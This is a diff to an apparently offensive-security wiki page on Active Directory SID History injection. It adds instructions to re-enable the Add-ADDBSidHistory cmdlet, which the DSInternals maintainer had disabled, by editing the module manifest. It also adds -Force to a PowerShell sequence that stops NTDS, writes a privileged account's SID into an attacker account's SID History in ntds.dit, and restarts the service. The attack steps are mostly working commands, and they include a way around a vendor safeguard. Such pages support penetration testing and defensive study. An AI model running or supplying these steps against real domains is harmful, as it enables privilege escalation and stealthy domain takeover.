@@ -48,10 +48,21 @@ The only known way to add a SID to the SID History attribute of an account on a 
 > [!CAUTION]
 > The NTDS service must be stopped at some point and restarted for this procedure to work, which can cause various issues. Proceed with care, avoid production systems.
 
+It is necessary to re-enable the `Add-ADDBSidHistory` function, which has been disabled in version [4.15](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/CHANGELOG.md#415---2024-12-23) of DSInternals:
+
 ```powershell
 # Install DSInternals on the domain controller
 Install-Module -Name DSInternals
 
+# Modify the file DSInternals.psd1
+notepad.exe (Join-Path (Get-InstalledModule -Name DSInternals | Select-Object -ExpandProperty InstalledLocation) 'DSInternals.psd1')
+
+# Then replace the line "# Intentionally excluded: 'Add-ADDBSidHistory'" with "'Add-ADDBSidHistory'"
+```
+
+Then, open a new PowerShell console:
+
+```powershell
 # Find the account SID you want to inject
 Get-ADUser -Identity $InterestingUser
 
@@ -59,7 +70,7 @@ Get-ADUser -Identity $InterestingUser
 Stop-service NTDS -force
 
 # Inject the SID into the SID History attribute
-Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit
+Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit -Force
 
 # Start the NTDS service
 Start-service NTDS
@@ -80,3 +91,5 @@ Start-service NTDS
 [https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya](https://learn.microsoft.com/en-us/windows/win32/api/ntdsapi/nf-ntdsapi-dsaddsidhistorya)
 
 [https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/](https://secframe.com/blog/a-sidhistory-attack-marching-onto-a-dc/)
+
+[https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Add-ADDBSidHistory.md](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Add-ADDBSidHistory.md)
